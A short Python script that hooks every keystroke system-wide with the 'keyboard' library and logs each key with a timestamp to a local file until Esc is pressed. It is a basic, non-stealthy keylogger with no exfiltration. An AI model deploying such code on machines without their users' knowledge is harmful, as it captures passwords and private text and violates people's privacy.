import keyboard
import logging

# Set up the logger
logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

def on_key_event(e):
    if e.event_type == keyboard.KEY_DOWN:
        key = e.name
        # print(f'{key}')

        # Log the pressed key
        logging.info(f'### {key}')

        # Check if the Esc key is pressed
        if key == 'esc':
            print('Exiting program...')
            keyboard.unhook_all()
            raise SystemExit

keyboard.hook(on_key_event)

try:
    # Keep the program running
    keyboard.wait()

except KeyboardInterrupt:
    # Handle keyboard interrupt (Ctrl+C)
    pass

finally:
    # Clean up and unhook the keyboard
    keyboard.unhook_all()